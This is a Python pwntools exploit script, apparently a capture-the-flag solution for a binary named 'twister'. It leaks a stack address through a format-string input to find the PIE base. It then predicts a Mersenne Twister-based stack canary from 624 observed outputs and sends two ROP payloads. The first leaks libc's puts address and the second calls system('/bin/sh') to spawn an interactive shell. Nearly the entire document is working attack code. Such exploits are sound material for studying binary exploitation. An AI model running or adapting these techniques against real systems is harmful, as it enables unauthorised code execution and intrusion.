#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./twister
from pwn import *
import sys

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './twister')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

####### twister stuff ##########
# if using the custom impl
from mt19937 import MT19937

# if using the public library
# from mt19937predictor import MT19937Predictor
################################

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

context.terminal = ['tmux', 'splitw', '-h']

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

##### offsets #####

answer_buffer_size = 0xFF
end_answer_buffer_padding = 0x1
buffer_canary_padding = 0x4
canary_ret_padding = 0x10
base_leaked_stack_offset = 0x3d48
pop_rdi_offset = 0x1331
got_puts_offset = 0x3F58
puts_offset = 0x1140
start_offset = 0x1a2e
ret_offset = 0x101a

# libc6_2.35-0ubuntu3.5_amd64
libc_puts_offset = 0x80E50
libc_binsh_offset = 0x1D8678
libc_system_offset = 0x50D70

####################

##### leak a value off of the stack and get piebase
##### use gdb to verify that this value has the desired offset

io.sendlineafter(b"]:", b"c")
io.sendlineafter(b"(y/n) ", b"%10$p")
io.recvuntil(b"user input: ")

stack_value = io.recvline()[:-1]
piebase = int(stack_value, 16) - base_leaked_stack_offset
exe.address = piebase
print(f"piebase: {hex(piebase)}")

io.sendlineafter(b"please try again:", b"n")

####################

##### get canary helper. every time we play the game,
##### the canary resets, so we'll have to call this fn.
##### this uses a custom impl but can be done with
##### libraries like MT19937Predictor


def _get_canary(wait=True) -> int:
    twister_state = []
    if wait:
        io.sendlineafter(b"]:", b"c")
    else:
        io.sendline(b"c")
    iters = 631 # anything >= 624 works
    for i in range(iters):
        if i%10 == 0:
            nl = "\n" if i == iters-1 else ""
            pfx = "canary state: " if i == 0 else "..."
            print(f"{pfx}{i}", end=nl)
        io.recvuntil(b"canary_id: ")
        twister_state.append(int(io.recvline()[:-1]))
        io.sendlineafter(b"(y/n) ", b"y")

    io.recvuntil(b"canary_id: ")
    twister_state.append(int(io.recvline()[:-1]))
    io.sendlineafter(b"(y/n) ", b"n")

    predictor = MT19937()
    canary = predictor.predict(twister_state[-624:])

    # (if using library instead)
    # predictor = MT19937Predictor()
    # for state in twister_state:
    #     predictor.setrandbits(state, 32)
    # canary = predictor.getrandbits(32)

    return canary

####################

##### play the game helper


def _play_game(callback):
    io.sendlineafter(b"]:", b"p")
    for i in range(10):
        io.recvuntil(b". ")
        question = io.recvuntil(b":")[:-1].decode("utf-8")
        num1, num2 = map(int, question.split("+"))
        ans = num1 + num2

        encoded_ans = str(ans).encode()

        if i == 9:
            payload = callback(encoded_ans)
            io.sendline(payload)
        else:
            io.sendline(encoded_ans)

####################

##### leak libc

gadget = piebase + pop_rdi_offset
puts_got = piebase + got_puts_offset
puts_plt = piebase + puts_offset
start_addr = piebase + start_offset
ret = piebase + ret_offset
print(f"gadget: {hex(gadget)}")
print(f"puts_got: {hex(puts_got)}")
print(f"puts_plt: {hex(puts_plt)}")
print(f"start_addr: {hex(start_addr)}")
print(f"ret: {hex(ret)}")

canary = _get_canary()
print(f"canary: {hex(canary)}")

def leak_libc_callback(encoded_ans: bytes) -> bytes:
    """Leak libc."""
    buffer_to_canary_padding = b"A" * (
        answer_buffer_size
        + end_answer_buffer_padding
        - len(encoded_ans)
        - 1
        + buffer_canary_padding
    )
    payload = (
        encoded_ans
        + b"\x00"
        + buffer_to_canary_padding
        + canary.to_bytes(4, byteorder="little")
        + b"A" * canary_ret_padding
        + gadget.to_bytes(8, byteorder="little")
        + puts_got.to_bytes(8, byteorder="little")
        + puts_plt.to_bytes(8, byteorder="little")
        + start_addr.to_bytes(8, byteorder="little")
    )
    return payload


_play_game(leak_libc_callback)

io.sendlineafter(b"(y/n) ", b"n")

libc_puts_addr = unpack(io.recv()[:6].ljust(8, b"\x00"))
print("libc_puts_addr", hex(libc_puts_addr))

#########################

###### get the shell

canary = _get_canary(wait=False)
print(f"canary: {hex(canary)}")

libc_base = libc_puts_addr - libc_puts_offset
binsh = libc_base + libc_binsh_offset
system = libc_base + libc_system_offset
print(f"libc_base: {hex(libc_base)}")
print(f"binsh: {hex(binsh)}")
print(f"system: {hex(system)}")

def get_shell_callback(encoded_ans: bytes) -> bytes:
    """Get the shell."""
    buffer_to_canary_padding = b"A" * (
        answer_buffer_size
        + end_answer_buffer_padding
        - len(encoded_ans)
        - 1
        + buffer_canary_padding
    )
    payload = (
        encoded_ans
        + b"\x00"
        + buffer_to_canary_padding
        + canary.to_bytes(4, byteorder="little")
        + b"A" * canary_ret_padding
        + ret.to_bytes(8, byteorder="little")
        + gadget.to_bytes(8, byteorder="little")
        + binsh.to_bytes(8, byteorder="little")
        + system.to_bytes(8, byteorder="little")
    )
    return payload


_play_game(get_shell_callback)

io.sendlineafter(b"(y/n) ", b"n")

io.interactive()
